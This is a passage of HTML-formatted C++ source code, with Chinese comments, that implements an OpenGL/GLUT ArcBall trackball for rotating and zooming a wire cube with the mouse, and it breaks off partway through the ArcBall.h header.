&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>#include &lt;GL/glew.h&gt;<br>#include &lt;GL/glut.h&gt;<br>#include &lt;GL/glu.h&gt;<br>#include &lt;math.h&gt;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>#include "ArcBall.h"&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br><br>//初始化，必须用全局变量的方式，不能用new<br>ArcBallT arcBall(600.0f,400.0f);<br>ArcBallT*&nbsp;&nbsp;&nbsp; ArcBall =&amp;arcBall;// new ArcBallT(600.0f,400.0f);//&amp;arcBall;<br><br>void reshape(int w, int h){<br>&nbsp;&nbsp;&nbsp; glViewport(0,0, w, h);<br>&nbsp;&nbsp;&nbsp; glMatrixMode(GL_PROJECTION);<br>&nbsp;&nbsp;&nbsp; glLoadIdentity();<br>&nbsp;&nbsp;&nbsp; glFrustum(-1, 1, -1, 1, 1.5, 20);<br>&nbsp;&nbsp;&nbsp; glMatrixMode(GL_MODELVIEW);<br>&nbsp;&nbsp;&nbsp; ////ball<br>&nbsp;&nbsp;&nbsp; ArcBall-&gt;setBounds((GLfloat)w, (GLfloat)h);//1. 设置窗口边界<br>}<br>void init(){<br>&nbsp;&nbsp;&nbsp; glClearColor(0,0,0,0);<br>&nbsp;&nbsp;&nbsp; glShadeModel(GL_FLAT);<br>}<br><br>void display (void)<br>{<br><br>&nbsp;&nbsp;&nbsp; glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; glColor3f(1.0,1.0,1.0);<br>&nbsp;&nbsp;&nbsp; glLoadIdentity();<br>&nbsp;&nbsp;&nbsp; gluLookAt(0.0, 0.0, 5.0,<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 0.0, 0.0, 0.0,<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 0.0, 1.0, 0.0);<br>&nbsp;&nbsp;&nbsp; glScalef(1.0, 2.0, 1.0);<br><br>&nbsp;&nbsp;&nbsp; //glPushMatrix();&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; glTranslatef(0,0,-3);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; glScalef(ArcBall-&gt;zoomRate, ArcBall-&gt;zoomRate, ArcBall-&gt;zoomRate);//2. 缩放<br>&nbsp;&nbsp;&nbsp; glMultMatrixf(ArcBall-&gt;Transform.M);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //3. 旋转<br>&nbsp;&nbsp;&nbsp; glutWireCube(1.0);<br>&nbsp;&nbsp;&nbsp; //glPopMatrix();&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br><br>&nbsp;&nbsp;&nbsp; glFlush ();&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>}<br>//移动<br>void move(int x, int y)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>{<br>&nbsp;&nbsp;&nbsp; ArcBall-&gt;MousePt.s.X = x;<br>&nbsp;&nbsp;&nbsp; ArcBall-&gt;MousePt.s.Y = y;<br>&nbsp;&nbsp;&nbsp; ArcBall-&gt;upstate();<br>&nbsp;&nbsp;&nbsp; glutPostRedisplay();<br>}<br>//点击<br>void mouse(int button, int state, int x, int y) <br>{<br>&nbsp;&nbsp;&nbsp; if(button == GLUT_LEFT_BUTTON &amp;&amp; state==GLUT_DOWN){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ArcBall-&gt;isClicked = true;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; move(x,y);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; else if(button == GLUT_LEFT_BUTTON &amp;&amp; state==GLUT_UP)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ArcBall-&gt;isClicked = false;<br>&nbsp;&nbsp;&nbsp; else if(button == GLUT_RIGHT_BUTTON &amp;&amp; state==GLUT_DOWN){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ArcBall-&gt;isRClicked = true;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; move(x,y);<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; else if(button == GLUT_RIGHT_BUTTON &amp;&amp; state == GLUT_UP)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ArcBall-&gt;isRClicked = false;<br>&nbsp;&nbsp;&nbsp; ArcBall-&gt;upstate();<br>&nbsp;&nbsp;&nbsp; glutPostRedisplay();<br>}<br>int main(int argc, char** argv){<br>&nbsp;&nbsp;&nbsp; glutInit(&amp;argc, argv);<br>&nbsp;&nbsp;&nbsp; glutInitDisplayMode(GLUT_SINGLE|GLUT_RGB);<br>&nbsp;&nbsp;&nbsp; glutInitWindowSize(640,480);<br>&nbsp;&nbsp;&nbsp; glutCreateWindow("HI");<br><br>&nbsp;&nbsp;&nbsp; init();<br>&nbsp;&nbsp;&nbsp; glutDisplayFunc(display);<br>&nbsp;&nbsp;&nbsp; glutReshapeFunc(reshape);<br><br>&nbsp;&nbsp;&nbsp; glutMouseFunc(mouse);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //registered the mouse event.<br>&nbsp;&nbsp;&nbsp; glutMotionFunc(move);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //registered the move event<br><br>&nbsp;&nbsp;&nbsp; glutMainLoop();<br><br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br>////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////<br>
///////////////////////////////////////////////////ArcBall.cpp////////////////////////////////////////////////////////<br>
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////<br>//#include &lt;windows.h&gt;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>#include &lt;GL/glew.h&gt;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br><br>#include &lt;math.h&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>#include "ArcBall.h"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br><br>//轨迹球参数:<br>//直径&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 2.0f<br>//半径&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 1.0f<br>//半径平方&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 1.0f<br><br><br>void ArcBall_t::_mapToSphere(const Point2fT* NewPt, Vector3fT* NewVec) const<br>{<br>&nbsp;&nbsp;&nbsp; Point2fT TempPt;<br>&nbsp;&nbsp;&nbsp; GLfloat length;<br><br>&nbsp;&nbsp;&nbsp; //复制到临时变量<br>&nbsp;&nbsp;&nbsp; TempPt = *NewPt;<br><br>&nbsp;&nbsp;&nbsp; //把长宽调整到[-1 ... 1]区间<br>&nbsp;&nbsp;&nbsp; TempPt.s.X&nbsp; =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (TempPt.s.X * this-&gt;AdjustWidth)&nbsp; - 1.0f;<br>&nbsp;&nbsp;&nbsp; TempPt.s.Y&nbsp; = 1.0f - (TempPt.s.Y * this-&gt;AdjustHeight);<br><br>&nbsp;&nbsp;&nbsp; //计算长度的平方<br>&nbsp;&nbsp;&nbsp; length&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = (TempPt.s.X * TempPt.s.X) + (TempPt.s.Y * TempPt.s.Y);<br><br>&nbsp;&nbsp;&nbsp; //如果点映射到球的外面<br>&nbsp;&nbsp;&nbsp; if (length &gt; 1.0f)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; GLfloat norm;<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //缩放到球上<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; norm&nbsp;&nbsp;&nbsp; = 1.0f / FuncSqrt(length);<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //设置z坐标为0<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewVec-&gt;s.X = TempPt.s.X * norm;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewVec-&gt;s.Y = TempPt.s.Y * norm;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewVec-&gt;s.Z = 0.0f;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; //如果在球内<br>&nbsp;&nbsp;&nbsp; else&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //利用半径的平方为1,求出z坐标<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewVec-&gt;s.X = TempPt.s.X;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewVec-&gt;s.Y = TempPt.s.Y;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewVec-&gt;s.Z = FuncSqrt(1.0f - length);<br>&nbsp;&nbsp;&nbsp; }<br>}<br><br>ArcBall_t::ArcBall_t(GLfloat NewWidth, GLfloat NewHeight)<br>{<br>&nbsp;&nbsp;&nbsp; this-&gt;StVec.s.X&nbsp;&nbsp;&nbsp;&nbsp; =0.0f;<br>&nbsp;&nbsp;&nbsp; this-&gt;StVec.s.Y&nbsp;&nbsp;&nbsp;&nbsp; = 0.0f;<br>&nbsp;&nbsp;&nbsp; this-&gt;StVec.s.Z&nbsp;&nbsp;&nbsp;&nbsp; = 0.0f;<br><br>&nbsp;&nbsp;&nbsp; this-&gt;EnVec.s.X&nbsp;&nbsp;&nbsp;&nbsp; =0.0f;<br>&nbsp;&nbsp;&nbsp; this-&gt;EnVec.s.Y&nbsp;&nbsp;&nbsp;&nbsp; = 0.0f;<br>&nbsp;&nbsp;&nbsp; this-&gt;EnVec.s.Z&nbsp;&nbsp;&nbsp;&nbsp; = 0.0f;<br><br><br>&nbsp;&nbsp;&nbsp; Matrix4fSetIdentity(&amp;Transform);<br>&nbsp;&nbsp;&nbsp; Matrix3fSetIdentity(&amp;LastRot);<br>&nbsp;&nbsp;&nbsp; Matrix3fSetIdentity(&amp;ThisRot);<br><br>&nbsp;&nbsp;&nbsp; this-&gt;isDragging=false;<br>&nbsp;&nbsp;&nbsp; this-&gt;isClicked= false;<br>&nbsp;&nbsp;&nbsp; this-&gt;isRClicked = false;<br>&nbsp;&nbsp;&nbsp; this-&gt;isZooming = false;<br>&nbsp;&nbsp;&nbsp; this-&gt;zoomRate = 1;<br>&nbsp;&nbsp;&nbsp; this-&gt;setBounds(NewWidth, NewHeight);<br>}<br><br>void ArcBall_t::upstate()<br>{<br>&nbsp;&nbsp;&nbsp; if(!this-&gt;isZooming &amp;&amp; this-&gt;isRClicked){&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 开始拖动<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; this-&gt;isZooming = true;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 设置拖动为变量为true&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; this-&gt;LastPt = this-&gt;MousePt;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; this-&gt;lastZoomRate = this-&gt;zoomRate;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; else if(this-&gt;isZooming){//正在拖动<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(this-&gt;isRClicked){&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //拖动&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Point2fSub(&amp;this-&gt;MousePt, &amp;this-&gt;LastPt);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; this-&gt;zoomRate = this-&gt;lastZoomRate + this-&gt;MousePt.s.X * this-&gt;AdjustWidth * 2;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else{&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //停止拖动<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; this-&gt;isZooming = false;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; else if (!this-&gt;isDragging &amp;&amp; this-&gt;isClicked){&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 如果没有拖动<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; this-&gt;isDragging = true;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 设置拖动为变量为true<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; this-&gt;LastRot = this-&gt;ThisRot;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; this-&gt;click(&amp;this-&gt;MousePt);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; else if(this-&gt;isDragging){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (this-&gt;isClicked){&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //如果按住拖动<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Quat4fT&nbsp;&nbsp;&nbsp;&nbsp; ThisQuat;<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; this-&gt;drag(&amp;this-&gt;MousePt, &amp;ThisQuat);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 更新轨迹球的变量<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Matrix3fSetRotationFromQuat4f(&amp;this-&gt;ThisRot, &amp;ThisQuat);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 计算旋转量<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Matrix3fMulMatrix3f(&amp;this-&gt;ThisRot, &amp;this-&gt;LastRot);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Matrix4fSetRotationFromMatrix3f(&amp;this-&gt;Transform, &amp;this-&gt;ThisRot);&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 如果放开鼠标，设置拖动为false<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; this-&gt;isDragging = false;<br>&nbsp;&nbsp;&nbsp; }<br>}<br>/*<br>void ArcBall_t::mousemove(WPARAM wParam,LPARAM lParam)<br>{<br>this-&gt;MousePt.s.X = (GLfloat)LOWORD(lParam);<br>this-&gt;MousePt.s.Y = (GLfloat)HIWORD(lParam);<br>this-&gt;isClicked&nbsp;&nbsp; = (LOWORD(wParam) &amp; MK_LBUTTON) ? true : false;<br>this-&gt;isRClicked&nbsp; = (LOWORD(wParam) &amp; MK_RBUTTON) ? true : false;<br>}<br>*/<br>//按下鼠标,记录当前对应的轨迹球的位置<br>void&nbsp;&nbsp;&nbsp; ArcBall_t::click(const Point2fT* NewPt)<br>{<br>&nbsp;&nbsp;&nbsp; this-&gt;_mapToSphere(NewPt, &amp;this-&gt;StVec);<br>}<br><br>//鼠标拖动,计算旋转四元数<br>void&nbsp;&nbsp;&nbsp; ArcBall_t::drag(const Point2fT* NewPt, Quat4fT* NewRot)<br>{<br>&nbsp;&nbsp;&nbsp; //新的位置<br>&nbsp;&nbsp;&nbsp; this-&gt;_mapToSphere(NewPt, &amp;this-&gt;EnVec);<br><br>&nbsp;&nbsp;&nbsp; //计算旋转<br>&nbsp;&nbsp;&nbsp; if (NewRot)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Vector3fT&nbsp; Perp;<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //计算旋转轴<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Vector3fCross(&amp;Perp, &amp;this-&gt;StVec, &amp;this-&gt;EnVec);<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //如果不为0<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (Vector3fLength(&amp;Perp) &gt; Epsilon)&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //记录旋转轴<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewRot-&gt;s.X = Perp.s.X;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewRot-&gt;s.Y = Perp.s.Y;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewRot-&gt;s.Z = Perp.s.Z;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //在四元数中,w=cos(a/2)，a为旋转的角度<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewRot-&gt;s.W= Vector3fDot(&amp;this-&gt;StVec, &amp;this-&gt;EnVec);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //是0，说明没有旋转<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewRot-&gt;s.X = <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewRot-&gt;s.Y = <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewRot-&gt;s.Z = <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; NewRot-&gt;s.W = 0.0f;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>}<br><br><br>
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////<br>
///////////////////////////////////////////////////ArcBall.h///////////////////////////////////////////////////////////<br>
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////<br>#ifndef _ArcBall_h<br>#define _ArcBall_h<br><br>#include &lt;stdlib.h&gt;<br><br>// 仅在Debug模式下，启用断言<br>#ifdef _DEBUG<br># include "assert.h"<br>#else<br># define assert(x) { }<br>#endif<br><br><br>//2维点<br>typedef union Tuple2f_t<br>{<br>&nbsp;&nbsp;&nbsp; struct<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; GLfloat X, Y;<br>&nbsp;&nbsp;&nbsp; } s;<br><br>&nbsp;&nbsp;&nbsp; GLfloat T[2];<br>} Tuple2fT;&nbsp;&nbsp;&nbsp;&nbsp; <br><br>//3维点<br>typedef union Tuple3f_t<br>{<br>&nbsp;&nbsp;&nbsp; struct<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; GLfloat X, Y, Z;<br>&nbsp;&nbsp;&nbsp; } s;<br><br>&nbsp;&nbsp;&nbsp; GLfloat T[3];<br>} Tuple3fT;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br><br>//4维点<br>typedef union Tuple4f_t<br>{<br>&nbsp;&nbsp;&nbsp; struct<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; GLfloat X, Y, Z, W;<br>&nbsp;&nbsp;&nbsp; } s;<br><br>&nbsp;&nbsp;&nbsp; GLfloat T[4];<br>} Tuple4fT;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br><br><br>//3x3矩阵<br>typedef union Matrix3f_t<br>{<br>&nbsp;&nbsp;&nbsp; struct<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //column major<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M00; GLfloat XX; GLfloat SX; };&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; union { GLfloat M10; GLfloat XY;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp; 